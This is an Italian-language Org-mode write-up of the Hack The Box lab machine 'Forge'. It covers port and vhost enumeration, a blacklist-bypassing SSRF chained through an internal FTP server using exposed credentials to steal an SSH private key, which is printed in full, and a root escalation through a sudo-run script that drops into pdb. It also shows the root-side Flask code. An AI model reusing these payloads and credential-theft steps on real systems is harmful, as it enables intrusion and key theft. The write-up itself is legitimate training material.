@@ -1,0 +1,615 @@
+#+TITLE: HTB - Forge
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV forge
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 18:37 CET
+Nmap scan report for forge (10.129.159.4)
+Host is up (0.050s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE    SERVICE VERSION
+21/tcp filtered ftp
+22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
+|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
+|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
+80/tcp open     http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://forge.htb
+Service Info: Host: 10.129.159.4; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap
+.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.89 seconds
+
+  #+end_example
+*** nmap -p- forge
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-30 18:37 CET
+Nmap scan report for forge (10.129.159.4)
+Host is up (0.077s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT   STATE    SERVICE
+21/tcp filtered ftp
+22/tcp open     ssh
+80/tcp open     http
+
+Nmap done: 1 IP address (1 host up) scanned in 35.54 seconds
+
+  #+end_example
+
+** gobuster
+*** leo@kali:~/repos/forge$ gobuster vhost -w ~/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://forge.htb -r
+    #+begin_example
+==============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://forge.htb
+[+] Method:       GET
+[+] Threads:      10
+[+] Wordlist:     /home/leo/repos/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2022/01/30 18:57:17 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: admin.forge.htb (Status: 200) [Size: 27]    
+    #+end_example
+
+** forge.htb
+*** error
+    #+begin_example
+An error occured! Error : HTTPConnectionPool(host='10.10.14.86', port=80): Max retries exceeded with url: /omg.jpg (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fb38939dc70>: Failed to establish a new connection: [Errno 111] Connection refused'))    
+    #+end_example
+
+*** SSRF
+    Nella pagina http://forge.htb/upload facendo 'upload from url' è
+    presente una SSRF 
+    
+    #+begin_example
+    http://admin.Forge.htb
+    #+end_example
+
+    In realtà va bene cambiando qualche lettera da minuscola a maiscuola in "forge.htb"
+
+    -----------------------
+
+    Chain di due SSRF per prendere chiave rsa utilizzando ftp interno
+    accessibile tramite web server admin.forge.htb con endpoint get
+    ~/upload?u=<FTP-URL>~.
+    
+    #+begin_example
+    http://admin.fOrge.htb/upload?u=ftp://user:heightofsecurity123!@localHOST/.ssh/id_rsa
+    #+end_example
+
+** admin.forge.htb
+
+*** / (index.html
+    
+    #+begin_src html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Portal</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <header>
+            <nav>
+                <h1 class=""><a href="/">Portal home</a></h1>
+                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br><br>
+    <br><br><br><br>
+    <center><h1>Welcome Admins!</h1></center>
+</body>
+</html>    
+    #+end_src
+
+*** /upload
+
+    Notiamo in particolare il codice
+    
+    #+begin_src html
+    <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+    #+end_src
+
+    che prima non c'era nella versione non-admin del sito (forge.htb)
+
+    #+begin_src html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Upload an image</title>
+</head>
+<body onload="show_upload_local_file()">
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/upload.css">
+    <script type="text/javascript" src="/static/js/main.js"></script>
+    <header>
+            <nav>
+                <h1 class=""><a href="/">Portal home</a></h1>
+                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <center>
+        <br><br>
+        <div id="content">
+            <h2 onclick="show_upload_local_file()">
+                Upload local file
+            </h2>
+            <h2 onclick="show_upload_remote_file()">
+                Upload from url
+            </h2>
+            <div id="form-div">
+                
+            </div>
+        </div>
+    </center>
+    <br>
+    <br>
+</body>
+</html>    
+    #+end_src
+
+*** /announcements
+    #+begin_src html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Announcements</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
+    <header>
+            <nav>
+                <h1 class=""><a href="/">Portal home</a></h1>
+                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br>
+    <ul>
+        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
+        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
+        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
+    </ul>
+</body>
+</html>    
+    #+end_src
+
+** internal ftp
+   Credenziali scritta in http://admin.forge.htb/announcements
+
+   #+begin_example
+   user:heightofsecurity123!
+   #+end_example
+   
+   Per rubare chiave rsa dobbiamo utilizzare il server ftp interno
+   tramite il seguente payload
+   
+   #+begin_example
+   http://admin.fOrge.htb/upload?u=ftp://user:heightofsecurity123!@localHOST/.ssh/id_rsa
+   #+end_example
+   
+   una volta eseguito il payload dobbiamo andare all'url ritornato dal
+   sito per prendere la flag.
+** rsa_key
+   #+begin_example
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
+-----END OPENSSH PRIVATE KEY-----   
+   #+end_example
+
+* PrivEsc
+** per user flag
+   La user flag si trova nella home directory dell'utente ~user~ non
+   appena entriamo tramite ssh.
+
+** user@forge.htb
+*** sudo -l
+    #+begin_example
+Matching Defaults entries for user on forge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on forge:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py    
+    #+end_example
+
+*** cat /opt/remote-manage.py
+    #+begin_src python
+#!/usr/bin/env python3
+import socket
+import random
+import subprocess
+import pdb
+
+port = random.randint(1025, 65535)
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(('127.0.0.1', port))
+    sock.listen(1)
+    print(f'Listening on localhost:{port}')
+    (clientsock, addr) = sock.accept()
+    clientsock.send(b'Enter the secret passsword: ')
+    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
+        clientsock.send(b'Wrong password!\n')
+    else:
+        clientsock.send(b'Welcome admin!\n')
+        while True:
+            clientsock.send(b'\nWhat do you wanna do: \n')
+            clientsock.send(b'[1] View processes\n')
+            clientsock.send(b'[2] View free memory\n')
+            clientsock.send(b'[3] View listening sockets\n')
+            clientsock.send(b'[4] Quit\n')
+            option = int(clientsock.recv(1024).strip())
+            if option == 1:
+                clientsock.send(subprocess.getoutput('ps aux').encode())
+            elif option == 2:
+                clientsock.send(subprocess.getoutput('df').encode())
+            elif option == 3:
+                clientsock.send(subprocess.getoutput('ss -lnt').encode())
+            elif option == 4:
+                clientsock.send(b'Bye\n')
+                break
+except Exception as e:
+    print(e)
+    pdb.post_mortem(e.__traceback__)
+finally:
+    quit()    
+    #+end_src
+** per flag root
+   L'idea è quella di avviare come root lo script in /opt/remote-manage.py
+   
+   #+begin_src sh
+sudo /usr/bin/python3 /opt/remote-manage.py       
+   #+end_src
+   
+   #+begin_example
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+Listening on localhost:49893   
+   #+end_example
+
+   dopo ci connettiamo alla porta che genera tramite nc
+   
+   #+begin_src sh
+nc localhost 49893
+   #+end_src
+
+   mettiamo la password
+   
+   #+begin_example
+   Enter the secret passsword: secretadminpassword
+Welcome admin!
+   #+end_example
+
+   e come opzione poi mettiamo un qualcosa di diverso da un
+   intero-stringa, tipo "fgfg"
+   
+   #+begin_example
+   fgfg
+   #+end_example
+
+   a questo punto la seguente linea di codice va in exception 
+   
+   #+begin_src python
+   option = int(clientsock.recv(1024).strip())
+   #+end_src
+
+   viene eseguito il codice per gestire l'exception
+   
+   #+begin_src python
+except Exception as e:
+    print(e)
+    pdb.post_mortem(e.__traceback__)   
+   #+end_src
+
+   e ci viene spawnata una shell ~pdb~ per debuggare il programma. 
+
+   Dato che questa shell è un interprete di python, e dato che esegue
+   da root, per avviare una shell da root ci basta fare
+   
+   #+begin_src python
+(Pdb) import pty; pty.spawn("/bin/bash")
+   #+end_src
+** root@forge.htb
+*** root@forge:/var/www/forge/forge# cat routes.py 
+
+    #+begin_src python
+from . import app
+from flask import render_template, request, send_from_directory,\
+    redirect
+import werkzeug
+import requests
+import random
+import string
+
+chars = string.ascii_letters + string.digits
+blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", "localhost",
+             '0.0.0.0', '[0:0:0:0:0:0:0:0]']
+
+navigation = [
+    {
+        "class": "",
+        "href": "/",
+        "caption": "Gallery",
+    },
+    {
+        "class": "align-right",
+        "href": "/upload",
+        "caption": "Upload an image",
+    }
+]
+
+
+@app.route("/")
+def index():
+    return render_template("index.html", navigation=navigation)
+
+
+@app.route("/upload", methods=["GET", "POST"])
+def upload():
+    if request.method == 'POST' and 'local' in request.form.keys():
+        return upload_local_file()
+    elif request.method == 'POST' and 'remote' in request.form.keys():
+        return upload_remote_file()
+    return render_template("upload.html", navigation=navigation)
+
+
+def upload_remote_file():
+    if 'url' not in request.form.keys():
+        return render_template("upload.html", navigation=navigation,
+                               message="No url defined!")
+    if request.form['url']:
+        try:
+            url = request.form['url']
+            if not (url.startswith('http://')
+                    or url.startswith('https://')):
+                return render_template('upload.html', navigation=navigation,
+                                       message="Invalid protocol! Supported protocols: http, https")
+            if any([i for i in blacklist if i in url]):
+                return render_template('upload.html', navigation=navigation,
+                                       message="URL contains a blacklisted address!")
+            req = requests.get(url)
+            name = rand(20)
+            f = open(app.config['UPLOAD_FOLDER'] + name, 'wb')
+            f.write(req.content)
+            f.close()
+            req.close()
+            return render_template('upload.html', navigation=navigation,
+                                   message="File uploaded successfully to the following url:",
+                                   url="http://forge.htb/uploads/" + name)
+        except Exception as e:
+            return render_template('upload.html', navigation=navigation,
+                                   message=f'An error occured! Error : {e}')
+    return render_template("upload.html", navigation=navigation,
+                           message="URL cannot be empty!")
+
+
+def rand(num):
+    return ''.join([random.choice(chars) for _ in range(num)])
+
+
+def upload_local_file():
+    f = request.files['file']
+    if f.filename == '':
+        return render_template("upload.html", navigation=navigation,
+                               message="No file defined!")
+    name = rand(20)
+    f.save(app.config['UPLOAD_FOLDER'] + name)
+    return render_template('upload.html', navigation=navigation,
+                           message="File uploaded successfully to the following url:",
+                           url="http://forge.htb/uploads/" + name)
+
+
+@app.route('/uploads')
+def redirect_to_uploads():
+    return redirect('/uploads/', code=301)
+
+
+@app.route('/uploads/<file>')
+def serve_uploaded_file(file=None):
+    if file:
+        name = werkzeug.utils.secure_filename(file)
+        #return send_from_directory(app.config['UPLOAD_FOLDER'], name)
+        resp = send_from_directory(app.config['UPLOAD_FOLDER'], name)
+        resp.headers['Content-Type'] = "image/jpg"
+        return resp
+
+
+
+@app.errorhandler(werkzeug.exceptions.HTTPException)
+def handle_error(e):
+    return e, e.code    
+    #+end_src
+*** root@forge:/var/www/admin/admin# cat routes.py 
+    
+    #+begin_src python
+from . import app
+from flask import render_template, request
+import werkzeug
+import requests
+import random
+import string
+from functools import wraps
+import shlex
+import subprocess
+
+chars = string.ascii_letters + string.digits
+blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", "localhost",
+             '0.0.0.0', '[0:0:0:0:0:0:0:0]']
+
+supported_schemas = ["http", "https", "ftp", "ftps"]
+
+navigation = [
+    {
+        "class": "",
+        "href": "/",
+        "caption": "Portal home",
+    },
+    {
+        "class": "align-right margin-right",
+        "href": "/announcements",
+        "caption": "Announcements",
+    },
+    {
+        "class": "align-right",
+        "href": "/upload",
+        "caption": "Upload image",
+    }
+]
+
+
+announce = [
+    "An internal ftp server has been setup with credentials as \
+user:heightofsecurity123!",
+    "The /upload endpoint now supports ftp, ftps, http and https\
+ protocols for uploading from url.",
+    "The /upload endpoint has been configured for easy scripting\
+ of uploads, and for uploading an image, one can simply pass\
+ a url with ?u=<url>."
+]
+
+
+def ensure_localhost(route_handler):
+    @wraps(route_handler)
+    def check_ip(*args):
+        if request.remote_addr == '127.0.0.1':
+            return route_handler(*args)
+        return "Only localhost is allowed!\n"
+    return check_ip
+
+
+@app.route("/")
+@ensure_localhost
+def index():
+    return render_template("index.html", navigation=navigation)
+
+
+@app.route("/upload", methods=["GET", "POST"])
+@ensure_localhost
+def upload():
+    if request.method == 'POST' and 'local' in request.form.keys():
+        return upload_local_file()
+    elif request.method == 'POST' and 'remote' in request.form.keys():
+        if 'url' not in request.form.keys():
+            return render_template("upload.html", navigation=navigation,
+                                   message="No url defined!")
+        return upload_remote_file(request.form['url'])
+    elif request.method == "GET" and 'u' in request.args.keys():
+        return upload_from_url()
+    return render_template("upload.html", navigation=navigation)
+
+
+def upload_remote_file(url):
+    if url:
+        try:
+            if not (any([x for x in supported_schemas if url.split('://')[0] == x])):
+                return render_template('upload.html', navigation=navigation,
+                                       message="Invalid protocol! Supported protocols: http, https, ftp, ftps")
+            if any([i for i in blacklist if i in url]):
+                return render_template('upload.html', navigation=navigation,
+                                       message="URL contains a blacklisted address!")
+            req = requests.get(url)
+            name = rand(20)
+            f = open(app.config['UPLOAD_FOLDER'] + name, 'w')
+            f.write(req.text)
+            f.close()
+            req.close()
+            return render_template('upload.html', navigation=navigation,
+                                   message="File uploaded successfully to the following url:",
+                                   url="http://forge.htb/uploads/" + name)
+        except Exception as e:
+            return render_template('upload.html', navigation=navigation,
+                                   message=f'An error occured! Error : {e}')
+    return render_template("upload.html", navigation=navigation,
+                           message="URL cannot be empty!")
+
+
+def rand(num):
+    return ''.join([random.choice(chars) for _ in range(num)])
+
+
+def upload_local_file():
+    f = request.files['file']
+    if f.filename == '':
+        return render_template("upload.html", navigation=navigation,
+                               message="No file defined!")
+    name = rand(20)
+    f.save(app.config['UPLOAD_FOLDER'] + name)
+    return render_template('upload.html', navigation=navigation,
+                           message="File uploaded successfully to the following url:",
+                           url="http://forge.htb/uploads/" + name)
+
+
+def upload_from_url():
+    u = request.args['u']
+    if u:
+        if u.startswith('http://') or u.startswith('https://'):
+            return upload_remote_file(u)
+        elif u.startswith('ftp://') or u.startswith('ftps://'):
+            u = shlex.quote(u)
+            return subprocess.check_output('curl ' + u, shell=True)
+        return "Invalid protocol! Supported protocols: http, https, ftp, ftps.\n"
+    return 'URL not given!\n'
+
+
+@app.errorhandler(werkzeug.exceptions.HTTPException)
+@ensure_localhost
+def handle_error(e):
+    return e, e.code
+
+
+@app.route('/announcements')
+@ensure_localhost
+def announcements():
+    return render_template('announcements.html', announcements=announce, navigation=navigation)    
+    #+end_src
